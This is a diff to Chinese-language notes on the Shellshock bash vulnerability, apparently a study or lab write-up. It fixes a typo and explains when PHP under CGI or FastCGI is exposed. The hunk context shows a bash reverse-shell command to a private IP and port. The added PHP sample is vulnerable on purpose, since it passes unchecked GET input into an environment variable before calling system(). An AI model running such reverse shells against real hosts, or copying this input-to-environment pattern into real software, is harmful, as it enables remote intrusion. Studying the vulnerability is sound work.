@@ -165,7 +165,7 @@ Server:$ /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1
 
 ## 针对 PHP 的远程攻击
 
-出发 shellshock 漏洞需要满足的条件：
+触发 shellshock 漏洞需要满足的条件：
 
 1. Bash 调用
    PHP 中的 system()函数，可以用它来执行外部命令
@@ -174,4 +174,21 @@ Server:$ /bin/bash -i > /dev/tcp/192.168.43.230/9090 0<&1 2>&1
 
    - Apache 组件
    - CGI (以 CGI 运行 php 可以满足)
-   - FastCGI (不能满足条件)
+   - FastCGI (不能满足条件， 但是在调用 system()函数之前，PHP 程序根据用户输入设置了环境变量，那么还是存在 shellshock 漏洞的)
+
+```php
+<?php
+    function getParam()
+    {
+        $arg = NULL;
+        if ((isset($_GET["arg"])) && !empty($_GET["arg"]))
+        {
+            $arg = $_GET["arg"];
+        }
+        return $arg;
+    }
+    $arg = getParam(); // 从用户输入的参数中获得一个参数
+    putenv("ARG=$arg"); // 把这个参数放在一个叫ARG的环境变量中
+    system("string /proc/$$/environ | grep ARG"); // 调用system()函数
+?>
+```
